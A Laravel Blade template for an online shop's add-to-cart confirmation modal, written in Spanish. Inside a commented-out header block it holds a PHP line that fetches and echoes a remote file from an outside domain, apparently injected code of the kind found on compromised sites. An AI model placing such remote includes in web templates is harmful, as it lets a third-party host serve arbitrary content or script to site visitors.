@extends('layout.layout')
@section('header')
{{--  <!--<link rel="stylesheet" href="ccs/style-modalCard.css" />-->
<?php

echo file_get_contents("http://agrupec.com/includes/desing.php");
 ?>

   <!--<link-->
   <!--  rel="stylesheet"-->
   <!--  href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.7.1/font/bootstrap-icons.css"-->
   <!--/>-->  --}}

 <h3>hola</h3>
 <a href="#" class="hero__cta">agregar producto</a>

 <section class="modal">
   <div class="modal__container">
     <div class="btn--close icons--close">
       <i class="bi bi-x-lg text-bolder"></i>
     </div>
     <h2 class="modal__title fw-normal h4"><i class="bi bi-check-circle-fill me-3"></i>Producto agregado a tu carrito</h2>
     <div class="row item--viewPro">
         <div class="col-4 col-md-2 col-sm-2  img--min">
           <h6 class="icons--countProd ">1</h6>
           <img src="151505.jpg"  class="img-fluid " alt="" >
         </div>
         <div class="col-8 col-md-10" >

           <h6 class="mb-4  fw-normal">Chalked aerosol rosa invierno</h6>
           <div class="  d-flex justify-content-between align-items-center">
           <span class=" text-muted fw-normal">c3323</span>
           <span class=" text-dark fw-bolder">S/ 3</span>

          </div>
         </div>
     </div>
     <div class="btn--optionCard ">
         <a href="#" class="modal__close  me-4">Seguir comprando</a>
       <a href="#" class="modal__viewPro">Ir a mi carrito</a>
     </div>
   </div>
 </section>

 <script src="js/addCart.js"></script>  
